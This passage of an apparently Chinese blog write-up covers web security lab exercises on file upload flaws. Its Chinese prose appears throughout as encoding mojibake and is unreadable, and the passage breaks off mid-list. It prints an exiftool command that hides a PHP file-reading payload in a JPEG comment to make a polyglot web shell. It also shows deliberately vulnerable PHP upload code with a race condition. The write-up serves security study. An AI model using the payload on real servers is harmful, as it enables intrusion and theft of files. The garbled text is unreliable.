<p>é™¤äº† apache2.conf è¿™ä¸ªç³»ç»Ÿçº§çš„é…ç½®æ–‡ä»¶ï¼ŒApache æœåŠ¡å™¨å…è®¸åœ¨æ¯ä¸ªç›®å½•ä¸‹æ”¾ç½®ä¸€ä¸ª <code>.htaccess</code> æ–‡ä»¶ï¼Œåœ¨è¯¥æ–‡ä»¶ä¸­æ·»åŠ çš„æŒ‡ä»¤å¯ä»¥è¦†ç›–å’Œè¡¥å…… apache2.conf çš„é…ç½®ã€‚å¦‚æœåº”ç”¨ç¨‹åºå…è®¸ä¸Šä¼  <code>.htaccess</code> ï¼Œé‚£ä¹ˆå°±èƒ½åˆ©ç”¨å®ƒç»•è¿‡å®‰å…¨é˜²æŠ¤ï¼Œæ‰§è¡Œä»£ç ã€‚</p>
</li>
<li class="lvl-4">
<p>IIS æœåŠ¡å™¨ä¹Ÿæœ‰ä¸€ä¸ªç±»ä¼¼çš„é…ç½®æ–‡ä»¶ï¼Œåä¸º <code>web.config</code>ï¼Œå®ƒçš„æŒ‡ä»¤ç¤ºä¾‹ï¼š</p>
<ul class="lvl-4">
<li class="lvl-6">
<p>//.json æ–‡ä»¶è¢«å½“æˆ json å‘é€ç»™å®¢æˆ·ç«¯ã€‚</p>
<blockquote>
<staticContent>
    <mimeMap fileextension=".json" mimetype="application/json">
    </mimeMap></staticContent>
</blockquote>
</li>
</ul>
</li>
</ul>
</li>
</ul>

    </div>
</div>
<h3 id="æ–‡ä»¶å†…å®¹éªŒè¯å­˜åœ¨ç¼ºé™·">æ–‡ä»¶å†…å®¹éªŒè¯å­˜åœ¨ç¼ºé™·</h3>
<p>æ›´å®‰å…¨çš„æœåŠ¡å™¨ä¼šå°è¯•éªŒè¯æ–‡ä»¶å†…å®¹æ˜¯å¦ä¸é¢„æœŸç›¸ç¬¦ï¼Œè€Œä¸æ˜¯éšå«åœ°ä¿¡ä»»è¯·æ±‚ä¸­æŒ‡å®šçš„ <code>Content-Type</code>ã€‚</p>
<p>åœ¨å›¾åƒä¸Šä¼ åŠŸèƒ½ä¸­ï¼ŒæœåŠ¡å™¨å¯èƒ½ä¼šå°è¯•éªŒè¯å›¾åƒçš„æŸäº›å›ºæœ‰å±æ€§ï¼Œå¦‚å°ºå¯¸ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨å°è¯•ä¸Šä¼ ä¸€ä¸ª PHP è„šæœ¬ï¼Œå®ƒæ ¹æœ¬ä¸ä¼šæœ‰ä»»ä½•å°ºå¯¸ã€‚å› æ­¤ï¼ŒæœåŠ¡å™¨ä¼šæ¨æ–­å®ƒä¸å¯èƒ½æ˜¯å›¾åƒï¼Œå¹¶ç›¸åº”åœ°æ‹’ç»ä¸Šä¼ ã€‚</p>
<p>åŒæ ·ï¼ŒæŸäº›æ–‡ä»¶ç±»å‹çš„é¡µçœ‰æˆ–é¡µè„šå¯èƒ½æ€»æ˜¯åŒ…å«ç‰¹å®šçš„å­—èŠ‚åºåˆ—ã€‚è¿™äº›åºåˆ—å°±åƒæŒ‡çº¹æˆ–ç­¾åä¸€æ ·ï¼Œå¯ç”¨äºç¡®å®šæ–‡ä»¶å†…å®¹æ˜¯å¦ä¸é¢„æœŸç±»å‹ç›¸ç¬¦ã€‚ä¾‹å¦‚ï¼ŒJPEG æ–‡ä»¶æ€»æ˜¯ä»¥ <code>FF D8 FF</code> å­—èŠ‚å¼€å§‹ã€‚</p>
<p>è¿™æ˜¯éªŒè¯æ–‡ä»¶ç±»å‹çš„ä¸€ç§æ›´ç¨³å¥çš„æ–¹æ³•ï¼Œä½†å³ä¾¿å¦‚æ­¤ä¹Ÿå¹¶éä¸‡æ— ä¸€å¤±ã€‚ä½¿ç”¨ ExifTool ç­‰ç‰¹æ®Šå·¥å…·ï¼ˆExiftool å·¥å…·åœ¨ kali ç³»ç»Ÿä¸­å·²é»˜è®¤å®‰è£…ï¼‰ï¼Œå¯ä»¥è½»è€Œæ˜“ä¸¾åœ°åˆ›å»ºä¸€ä¸ªåœ¨å…ƒæ•°æ®ä¸­åŒ…å«æ¶æ„ä»£ç çš„å¤šæ ¼å¼ JPEG æ–‡ä»¶ã€‚</p>
<h4 id="Lab-é€šè¿‡å¤šè¯­è¨€ç½‘ç»œå¤–å£³ä¸Šä¼ è¿œç¨‹æ‰§è¡Œä»£ç ">Lab: é€šè¿‡å¤šè¯­è¨€ç½‘ç»œå¤–å£³ä¸Šä¼ è¿œç¨‹æ‰§è¡Œä»£ç </h4>
<p>æœ¬å®éªŒå®¤åŒ…å«ä¸€ä¸ªæ˜“å—æ”»å‡»çš„å›¾ç‰‡ä¸Šä¼ åŠŸèƒ½ã€‚è™½ç„¶å®ƒä¼šæ£€æŸ¥æ–‡ä»¶å†…å®¹ä»¥éªŒè¯å…¶æ˜¯å¦ä¸ºçœŸæ­£çš„å›¾ç‰‡ï¼Œä½†ä»æœ‰å¯èƒ½ä¸Šä¼ å¹¶æ‰§è¡ŒæœåŠ¡å™¨ç«¯ä»£ç ã€‚è¦è§£å†³è¯¥å®éªŒé—®é¢˜ï¼Œè¯·ä¸Šä¼ ä¸€ä¸ªåŸºæœ¬çš„ PHP web shellï¼Œç„¶åç”¨å®ƒæ¥å¤–æ³„æ–‡ä»¶ /home/carlos/secret çš„å†…å®¹ã€‚ä½¿ç”¨å®éªŒå®¤æ¨ªå¹…ä¸­æä¾›çš„æŒ‰é’®æäº¤æ­¤ç§˜å¯†ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‡­æ®ç™»å½•è‡ªå·±çš„è´¦æˆ·ï¼šwiener:peter</p>
<p>è¿™é“é¢˜webåº”ç”¨å¯¹ä¸Šä¼ çš„æ–‡ä»¶å¤´åšäº†æ ¡éªŒï¼Œå¦‚æœæ²¡æœ‰è¯†åˆ«åˆ°é¢„æœŸçš„ç‰¹å¾ç å°±ä¼šæŠ¥é”™ï¼Œè¿™ç§æƒ…å†µä¸‹ï¼Œå¯ä»¥é€šè¿‡exiftoolæˆ–å…¶ä»–å·¥å…·æ¥ä¿®æ”¹æ–‡ä»¶å…ƒæ•°æ®ï¼Œæ’å…¥è„šæœ¬ç”Ÿæˆå¤šæ€jpegæ–‡ä»¶è¿›è¡Œç»•è¿‡ exiftoolå‘½ä»¤ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>ä¸ç®¡æ˜¯ç›´æ¥ä¸Šä¼ phpè„šæœ¬ï¼Œè¿˜æ˜¯å°è¯•å…¶ä»–åœ¨ä¹‹å‰å®éªŒå®¤é‡Œç”¨è¿‡çš„æŠ€æœ¯éƒ½å·²ç»ä¸è¡Œäº†ã€‚</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250506154133865.png" alt="image-20250506154133865"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>åˆ›å»ºä¸€ä¸ªå¤šè¯­ PHP/JPG æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶ä»æ ¹æœ¬ä¸Šè¯´æ˜¯ä¸€ä¸ªæ™®é€šå›¾åƒï¼Œä½†åœ¨å…ƒæ•°æ®ä¸­åŒ…å«äº† PHP æœ‰æ•ˆè½½è·ã€‚ä¸€ç§ç®€å•çš„æ–¹æ³•æ˜¯ä¸‹è½½å¹¶ä»å‘½ä»¤è¡Œè¿è¡Œ ExifToolï¼Œå°† PHP æœ‰æ•ˆè½½è·æ·»åŠ åˆ°å›¾ç‰‡çš„æ³¨é‡Šå­—æ®µï¼Œä»¥ .php æ‰©å±•åä¿å­˜å›¾ç‰‡ï¼Œç„¶åä¸Šä¼ ã€‚å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">exiftool -Comment=<span class="string">&quot;&lt;?php echo &#x27;START &#x27; . file_get_contents(&#x27;/home/carlos/secret&#x27;) . &#x27; END&#x27;; ?&gt;&quot;</span> NiuBi.jpg -o polyglot.php</span><br></pre></td></tr></table></figure>
<p><img src="/posts/34bab347//image-20250506160513314.png" alt="image-20250506160513314"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>å°†<code>polyglot</code> ä¸Šä¼ </p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250506160911322.png" alt="image-20250506160911322"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p><s>è®¿é—®å°±è¡Œå•¦</s>   æˆ‘é å’‹ä¸è¡Œï¼Œç½‘ä¸Šçš„éƒ½æ˜¯jpgï¼Œåº”è¯¥æ˜¯æ–‡ä»¶æ ¼å¼çš„é—®é¢˜å§ï¼Œå†ç”¨jpgè¯•ä¸€ä¸‹</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250506163353446.png" alt="image-20250506163353446"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>æœç„¶å¯ä»¥äº†ã€‚ã€‚ã€‚ç½‘ç»œçš„ä¸–ç•ŒçœŸæ˜¯å¥‡å¦™</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250506163844566.png" alt="image-20250506163844566"></p>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        è¡¥å……
    </div>
    <div class="spoiler-content">
        <ul class="lvl-0">
<li class="lvl-2">
<p>exiftoolå‘½ä»¤çš„å«ä¹‰</p>
<ul class="lvl-2">
<li class="lvl-4"><strong><code>exiftool</code></strong>ï¼šä¸€ä¸ªç”¨äºè¯»å†™æ–‡ä»¶å…ƒæ•°æ®ï¼ˆå¦‚EXIFä¿¡æ¯ï¼‰çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œå¸¸ç”¨äºå¤„ç†å›¾ç‰‡çš„æ‹æ‘„å‚æ•°ã€æ³¨é‡Šç­‰ã€‚</li>
<li class="lvl-4"><strong><code>-Comment=&quot;&lt;?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?&gt;&quot;</code></strong>
<ul class="lvl-4">
<li class="lvl-6">å°†JPEGå›¾ç‰‡çš„**æ³¨é‡Šå­—æ®µï¼ˆCommentï¼‰**ä¿®æ”¹ä¸ºä¸€æ®µPHPä»£ç ã€‚</li>
<li class="lvl-6">ä»£ç åŠŸèƒ½ï¼šè¯»å–æœåŠ¡å™¨ä¸Š**<code>/home/carlos/secret</code>**æ–‡ä»¶çš„å†…å®¹ï¼Œå¹¶åŒ…è£¹åœ¨<code>START</code>å’Œ<code>END</code>ä¹‹é—´è¾“å‡ºã€‚</li>
</ul>
</li>
<li class="lvl-4"><strong><code>-o polyglot.php</code>ï¼š<strong>å°†å¤„ç†åçš„æ–‡ä»¶è¾“å‡ºä¸º</strong><code>polyglot.php</code></strong>ã€‚ç”Ÿæˆçš„æ–‡ä»¶æ—¢æ˜¯åˆæ³•å›¾ç‰‡ï¼ˆä¿ç•™åŸJPEGæ•°æ®ï¼‰ï¼Œåˆæ˜¯PHPè„šæœ¬ï¼ˆå› æ‰©å±•åä¸º<code>.php</code>ä¸”åŒ…å«å¯æ‰§è¡Œä»£ç ï¼‰ã€‚</li>
</ul>
</li>
<li class="lvl-2">
<p>æ­¤é¢˜ä¸Šä¼ çš„æ–‡ä»¶ä¸º <code>polyglot.php</code> ï¼Œå½“ç„¶å¤§éƒ¨åˆ†æœåŠ¡å™¨æ˜¯ä¸èƒ½ä¸Šä¼ phpæ–‡ä»¶çš„ï¼Œä½†æ˜¯å¦‚æœèƒ½é‡‡ç”¨æŸäº›æ–¹æ³•å°†jpgè§£æä¸ºphpï¼Œè¿™æ®µä»£ç ä¾ç„¶æ˜¯å¯ä»¥æ‰§è¡Œçš„</p>
</li>
</ul>

    </div>
</div>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        ä¸ºä»€ä¹ˆä¸Šä¼ pngä¼šå¤±è´¥
    </div>
    <div class="spoiler-content">
        <ol>
<li class="lvl-3">
<p><strong>å…ƒæ•°æ®ç»“æ„çš„æœ¬è´¨å·®å¼‚</strong>ï¼š</p>
<ul class="lvl-2">
<li class="lvl-5"><strong>JPGï¼ˆJPEGï¼‰</strong>ï¼šä½¿ç”¨ <strong>EXIF æ ‡å‡†</strong>å­˜å‚¨å…ƒæ•°æ®ï¼Œå…è®¸ç›´æ¥å°†PHPä»£ç å†™å…¥<code>Comment</code>å­—æ®µã€‚ExifToolä¿®æ”¹åï¼Œæ–‡ä»¶ä»ä¿æŒæœ‰æ•ˆçš„JPEGç»“æ„ï¼ŒåŒæ—¶ä»£ç ä½äºå¯è¢«PHPè§£æçš„ä½ç½®ã€‚</li>
<li class="lvl-5"><strong>PNG</strong>ï¼šå…ƒæ•°æ®å­˜å‚¨åœ¨ <strong>â€œæ•°æ®å—â€ï¼ˆChunksï¼‰</strong> ä¸­ï¼ˆå¦‚<code>tEXt</code>ã€<code>iTXt</code>ç­‰ï¼‰ã€‚ç›´æ¥é€šè¿‡<code>-Comment</code>å‚æ•°æ³¨å…¥ä»£ç å¯èƒ½ç ´åPNGæ–‡ä»¶ç»“æ„ï¼Œæˆ–ä»£ç æœªå­˜å‚¨åœ¨æœåŠ¡å™¨ä¼šè§£æçš„ä½ç½®ã€‚</li>
</ul>
</li>
<li class="lvl-3">
<p><strong>PHPæ‰§è¡Œé€»è¾‘çš„å·®å¼‚</strong>ï¼š</p>
<ul class="lvl-2">
<li class="lvl-5">å³ä½¿æˆåŠŸæ³¨å…¥ä»£ç åˆ°PNGä¸­ï¼ŒPHPè§£æå™¨å¯èƒ½ä¸ä¼šæ‰§è¡Œä½äºPNGæ•°æ®å—ä¸­çš„ä»£ç ï¼Œå› ä¸ºPHPé»˜è®¤ä»æ–‡ä»¶å¼€å¤´è§£æï¼Œé‡åˆ°éPHPæ ‡ç­¾ï¼ˆå¦‚PNGçš„äºŒè¿›åˆ¶å¤´<code>â€°PNG</code>ï¼‰ä¼šç›´æ¥ç»ˆæ­¢æ‰§è¡Œã€‚</li>
</ul>
</li>
<li class="lvl-3">
<p><strong>æœåŠ¡å™¨å¯¹æ–‡ä»¶æ‰©å±•åçš„å¤„ç†</strong>ï¼š</p>
<ul class="lvl-2">
<li class="lvl-5">å¦‚æœä¸Šä¼ çš„PNGæ–‡ä»¶ä¿ç•™<code>.png</code>æ‰©å±•åï¼ŒæœåŠ¡å™¨å¯èƒ½ä¸ä¼šè°ƒç”¨PHPè§£æå™¨ï¼Œå³ä½¿å†…å®¹åŒ…å«PHPä»£ç ã€‚è€Œ<code>.php</code>æ‰©å±•åçš„æ–‡ä»¶ï¼ˆå¦‚ä½ ç”Ÿæˆçš„<code>polyglot.php</code>ï¼‰ä¼šè¢«å¼ºåˆ¶ç”¨PHPè§£æã€‚</li>
</ul>
</li>
<li class="lvl-3">
<p>æˆ‘æŒ‰ç…§deepseekç»™æˆ‘çš„æ–¹æ³•ç”¨pngè¿›è¡Œäº†å°è¯•ï¼Œä¾ç„¶å¤±è´¥äº†ã€‚é¦–å…ˆæˆ‘çš„PHPä»£ç æ²¡èƒ½å†™è¿›å»ï¼ˆæ£€æŸ¥æ—¶å‘ç°çš„ï¼‰ï¼Œç„¶åæœåŠ¡ç«¯ä¾ç„¶æ²¡èƒ½è§£æåç¼€phpçš„pngå›¾ç‰‡ã€‚æ„Ÿè§‰pngçš„å®‰å…¨æ€§åº”è¯¥æ˜¯æ¯”jpgé«˜çš„ã€‚</p>
</li>
<li class="lvl-3">
<p><strong>æ€»çš„æ¥è¯´ï¼š</strong></p>
<ul class="lvl-2">
<li class="lvl-5"><strong>JPGæˆåŠŸ</strong>ï¼šå› å…¶å…ƒæ•°æ®å…è®¸ç›´æ¥æ³¨å…¥PHPä»£ç ï¼Œä¸”ç”Ÿæˆæ–‡ä»¶æ‰©å±•åä¸º<code>.php</code>è§¦å‘æœåŠ¡å™¨è§£æã€‚</li>
<li class="lvl-5"><strong>PNGå¤±è´¥</strong>ï¼šå…ƒæ•°æ®å­˜å‚¨æ–¹å¼ä¸åŒï¼Œä¸”é»˜è®¤æ‰©å±•åï¼ˆ<code>.png</code>ï¼‰ä¸è§¦å‘PHPè§£æã€‚éœ€è°ƒæ•´æ³¨å…¥ä½ç½®æˆ–æ–‡ä»¶ç»“æ„æ‰èƒ½æˆåŠŸã€‚</li>
</ul>
</li>
</ol>

    </div>
</div>
<h3 id="åˆ©ç”¨æ–‡ä»¶ä¸Šä¼ ç«èµ›æ¡ä»¶">åˆ©ç”¨æ–‡ä»¶ä¸Šä¼ ç«èµ›æ¡ä»¶</h3>
<p>ç°ä»£æ¡†æ¶å¯¹æ­¤ç±»æ”»å‡»çš„é˜²å¾¡èƒ½åŠ›æ›´å¼ºã€‚å®ƒä»¬é€šå¸¸ä¸ä¼šç›´æ¥å°†æ–‡ä»¶ä¸Šä¼ åˆ°æ–‡ä»¶ç³»ç»Ÿä¸Šçš„ç›®æ ‡ä½ç½®ã€‚ç›¸åï¼Œå®ƒä»¬ä¼šé‡‡å–ä¸€äº›é¢„é˜²æªæ–½ï¼Œæ¯”å¦‚å…ˆä¸Šä¼ è‡³ä¸€ä¸ªä¸´æ—¶çš„æ²™ç›’ç›®å½•ï¼Œå¹¶éšæœºåŒ–åç§°ä»¥é¿å…è¦†ç›–ç°æœ‰æ–‡ä»¶ã€‚ç„¶åï¼Œå®ƒä»¬å¯¹ä¸´æ—¶æ–‡ä»¶è¿›è¡ŒéªŒè¯ï¼Œåªæœ‰åœ¨è®¤ä¸ºå®‰å…¨åæ‰å°†æ–‡ä»¶ä¼ è¾“åˆ°ç›®çš„åœ°ã€‚</p>
<p>å°½ç®¡å¦‚æ­¤ï¼Œå¼€å‘äººå‘˜æœ‰æ—¶ä¼šç‹¬ç«‹äºä»»ä½•æ¡†æ¶å®ç°è‡ªå·±çš„æ–‡ä»¶ä¸Šä¼ å¤„ç†ã€‚è¦åšå¥½è¿™ä¸€ç‚¹ä¸ä»…ç›¸å½“å¤æ‚ï¼Œè¿˜å¯èƒ½å¼•å…¥å±é™©çš„ç«èµ›æ¡ä»¶ï¼Œä½¿æ”»å‡»è€…èƒ½å¤Ÿå®Œå…¨ç»•è¿‡æœ€å¼ºå¤§çš„éªŒè¯ã€‚</p>
<p>ä¾‹å¦‚ï¼Œæœ‰äº›ç½‘ç«™ä¼šå°†æ–‡ä»¶ç›´æ¥ä¸Šä¼ åˆ°ä¸»æ–‡ä»¶ç³»ç»Ÿï¼Œå¦‚æœæ²¡æœ‰é€šè¿‡éªŒè¯ï¼Œå°±ä¼šå†æ¬¡åˆ é™¤ã€‚è¿™ç§è¡Œä¸ºåœ¨ä¾èµ–åç—…æ¯’è½¯ä»¶ç­‰æ£€æŸ¥æ¶æ„è½¯ä»¶çš„ç½‘ç«™ä¸­éå¸¸å…¸å‹ã€‚è¿™å¯èƒ½åªéœ€è¦å‡ æ¯«ç§’ï¼Œä½†åœ¨æ–‡ä»¶å­˜åœ¨äºæœåŠ¡å™¨ä¸Šçš„çŸ­æ—¶é—´å†…ï¼Œæ”»å‡»è€…ä»æœ‰å¯èƒ½æ‰§è¡Œè¯¥æ–‡ä»¶ã€‚</p>
<p>è¿™äº›æ¼æ´å¾€å¾€éå¸¸éšè”½ï¼Œå› æ­¤å¾ˆéš¾åœ¨é»‘ç›’æµ‹è¯•ä¸­å‘ç°ï¼Œé™¤éä½ èƒ½æ‰¾åˆ°æ³„éœ²ç›¸å…³æºä»£ç çš„æ–¹æ³•ã€‚</p>
<p>æ€»çš„æ¥è¯´å•Šå°±æ˜¯ï¼šå¾ˆå¤šæ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ä¸ä¼šå…ˆå°†ä¸Šä¼ çš„æ–‡ä»¶ä¸Šä¼ åˆ°ç›®æ ‡ä½ç½®ï¼Œè€Œæ˜¯å…ˆé€å»æ²™ç›’åŒ–ä¸´æ—¶ç›®å½•åšæ£€æŸ¥ï¼Œå¹¶éšæœºåŒ–å®ƒçš„åç§°ï¼Œçœ‹çœ‹ä»–æ˜¯ä¸æ˜¯æ¶æ„æ–‡ä»¶ï¼Œç„¶åå†ä¼ åˆ°æœ€ç»ˆç›®å½•ã€‚ä½†æ˜¯æœ‰çš„å¼€å‘è€…æ¯”è¾ƒç–å¿½ï¼ŒæŠŠæ–‡ä»¶ä¼ åˆ°è‡ªå·±çš„æ¡†æ¶ç›®å½•å¯¹å®ƒæ£€æŸ¥ã€‚è™½ç„¶æ£€æŸ¥çš„æ—¶é—´å¾ˆçŸ­ï¼Œä½†æ˜¯é»‘å®¢ä¾ç„¶å¯èƒ½åˆ©ç”¨çŸ­çŸ­çš„å‡ æ¯«ç§’æ—¶é—´æäº‹æƒ…ã€‚</p>
<p>å¦å¤–ï¼Œè¿˜æœ‰ä¸€ç§æƒ…å†µå¯èƒ½å‘ç”Ÿæ¡ä»¶ç«äº‰æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œå°±æ˜¯è®©ç”¨æˆ·æä¾›ä¸€ä¸ª URL æ¥ä¿å­˜æ–‡ä»¶ï¼Œè¿™ä¸€èˆ¬åªèƒ½ç”±å¼€å‘äººå‘˜è‡ªå·±ç¼–å†™å¤„ç†ç¨‹åºï¼Œä¹Ÿå¿…é¡»å…ˆä¸‹è½½ä¸€ä»½æ–‡ä»¶å‰¯æœ¬åˆ°æœ¬åœ°ï¼Œç„¶åå†åšå®‰å…¨æ€§éªŒè¯ï¼Œæ‰€ä»¥è¿™ç§æƒ…å†µå¾ˆå®¹æ˜“å‡ºç°æ¼æ´ã€‚å¦‚æœä¸Šä¼ çš„æ–‡ä»¶æˆ–é€šè¿‡ URL ä¸‹è½½çš„æ–‡ä»¶ä¿å­˜åˆ°ä¸€ä¸ªå…·æœ‰éšæœºåç§°çš„ä¸´æ—¶ç›®å½•ï¼Œè¿™ä¸€èˆ¬ä¸å¤ªå¯èƒ½è¢«æ”»å‡»è€…çŸ¥é“ï¼Œä½†å¦‚æœä¸´æ—¶ç›®å½•æ˜¯ä¼ªéšæœºæ•°ï¼Œé‚£ä¹ˆä»ç„¶æœ‰å¯èƒ½è¢«æ”»å‡»è€…ç”¨æš´åŠ›ç ´è§£çš„æ–¹æ³•çŸ¥é“ã€‚</p>
<p>ä¸ºäº†è®©æ¡ä»¶ç«äº‰ä¸Šä¼ æ–‡ä»¶çš„æ”»å‡»æ›´å®¹æ˜“ï¼Œæ”»å‡»è€…ä¼šä¸Šä¼ ä¸€ä¸ªæ¶æ„çš„å¤§æ–‡ä»¶ï¼Œé‡Œé¢å¡«å……å¤§é‡æ— ç”¨å­—ç¬¦ï¼Œä½†ä¸ä¼šå½±å“åˆ°é‡Œé¢çš„ä»£ç è¢«æ‰§è¡Œï¼Œåº”ç”¨ç¨‹åºå¤„ç†è¿™ç±»å¤§æ–‡ä»¶ä¼šå¤„ç†å¾—æ›´ä¹…ï¼Œé‚£ä¹ˆæ–‡ä»¶åœ¨æ–‡ä»¶ç³»ç»Ÿä¸Šåœç•™çš„æ—¶é—´æ›´ä¹…ï¼Œä¹Ÿå°±æ›´å®¹æ˜“è¢«æ”»å‡»è€…è¶æœºè®¿é—®ã€‚</p>
<h4 id="Labï¼š-é€šè¿‡ç«èµ›æ¡ä»¶ä¸Šä¼ ç½‘ç»œå¤–å£³">Labï¼š é€šè¿‡ç«èµ›æ¡ä»¶ä¸Šä¼ ç½‘ç»œå¤–å£³</h4>
<p>è¯¥å®éªŒå®¤åŒ…å«ä¸€ä¸ªæ˜“å—æ”»å‡»çš„å›¾ç‰‡ä¸Šä¼ åŠŸèƒ½ã€‚è™½ç„¶å®ƒå¯¹ä¸Šä¼ çš„ä»»ä½•æ–‡ä»¶éƒ½æ‰§è¡Œäº†ç¨³å¥çš„éªŒè¯ï¼Œä½†åˆ©ç”¨å…¶å¤„ç†æ–‡ä»¶æ–¹å¼ä¸­çš„ç«èµ›æ¡ä»¶ï¼Œå®Œå…¨å¯ä»¥ç»•è¿‡éªŒè¯ã€‚å¼•å…¥è¿™ä¸€ç«èµ›æ¡ä»¶çš„è„†å¼±ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//å­˜å‚¨ç›®æ ‡æ–‡ä»¶å¤¹å &#x27;avatars/&#x27;</span></span><br><span class="line"><span class="variable">$target_dir</span> = <span class="string">&quot;avatars/&quot;</span>;</span><br><span class="line"><span class="comment">//$target_file æ˜¯æœ€ç»ˆä¿å­˜æ–‡ä»¶çš„è·¯å¾„ã€‚</span></span><br><span class="line"><span class="comment">//$_FILES[&quot;avatar&quot;][&quot;name&quot;] æ˜¯ç”¨æˆ·ä¸Šä¼ æ–‡ä»¶çš„åŸå§‹åå­—ï¼ˆæ¯”å¦‚ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶å« cat.jpgï¼Œè¿™é‡Œå°±æ˜¯ cat.jpgï¼‰ã€‚</span></span><br><span class="line"><span class="variable">$target_file</span> = <span class="variable">$target_dir</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;avatar&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// temporary move</span></span><br><span class="line"><span class="comment">//$_FILES[&quot;avatar&quot;][&quot;tmp_name&quot;] æ˜¯æ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨åçš„ä¸´æ—¶å­˜å‚¨è·¯å¾„ï¼ˆæ¯”å¦‚ &#x27;/tmp/php123.tmp&#x27;ï¼‰ã€‚</span></span><br><span class="line"><span class="comment">//move_uploaded_file çš„ä½œç”¨æ˜¯å°†ä¸´æ—¶æ–‡ä»¶ç§»åŠ¨åˆ°ç›®æ ‡è·¯å¾„ $target_fileã€‚</span></span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;avatar&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$target_file</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¦‚æœæ–‡ä»¶é€šè¿‡äº†ç—…æ¯’æ£€æŸ¥(checkViruses)å’Œæ–‡ä»¶ç±»å‹æ£€æŸ¥(checkFileType)ï¼Œæ˜¾ç¤ºä¸Šä¼ æˆåŠŸï¼›å¦åˆ™åˆ é™¤æ–‡ä»¶ï¼Œæ˜¾ç¤ºé”™è¯¯ã€‚</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">checkViruses</span>(<span class="variable">$target_file</span>) &amp;&amp; <span class="title function_ invoke__">checkFileType</span>(<span class="variable">$target_file</span>)) &#123;</span><br><span class="line">    <span class="comment">//htmlspecialcharsï¼šé˜²æ­¢æ–‡ä»¶åä¸­çš„ç‰¹æ®Šå­—ç¬¦å¼•å‘å®‰å…¨é—®é¢˜ï¼ˆæ¯”å¦‚ &lt;script&gt; è¿™ç±»ä»£ç ï¼‰ã€‚</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;The file &quot;</span>. <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$target_file</span>). <span class="string">&quot; has been uploaded.&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="variable">$target_file</span>);<span class="comment">//åˆ é™¤æ–‡ä»¶ã€‚</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, there was an error uploading your file.&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">403</span>);<span class="comment">//è¿”å›â€œç¦æ­¢è®¿é—®â€çš„çŠ¶æ€ç ã€‚</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkViruses</span>(<span class="params"><span class="variable">$fileName</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// checking for viruses</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ£€æŸ¥æ–‡ä»¶æ‰©å±•åï¼ˆåç¼€ï¼‰æ˜¯å¦æ˜¯ jpg æˆ– pngã€‚</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFileType</span>(<span class="params"><span class="variable">$fileName</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//pathinfo($fileName, PATHINFO_EXTENSION)ï¼šæå–æ–‡ä»¶åçš„åç¼€ï¼ˆæ¯”å¦‚ cat.jpg æå–å‡º jpgï¼‰ã€‚</span></span><br><span class="line">    <span class="comment">//strtolowerï¼šå°†åç¼€è½¬ä¸ºå°å†™ï¼ˆé˜²æ­¢ JPG å’Œ jpg ä¸ä¸€è‡´ï¼‰ã€‚</span></span><br><span class="line">    <span class="variable">$imageFileType</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$fileName</span>,PATHINFO_EXTENSION));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$imageFileType</span> != <span class="string">&quot;jpg&quot;</span> &amp;&amp; <span class="variable">$imageFileType</span> != <span class="string">&quot;png&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Sorry, only JPG &amp; PNG files are allowed\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><font class="notice">æ³¨ï¼šæˆ‘phpå¤ªèœï¼Œç›´æ¥ä¸Šæ³¨é‡Šäº†</font></p>
<ul class="lvl-0">
<li class="lvl-2">
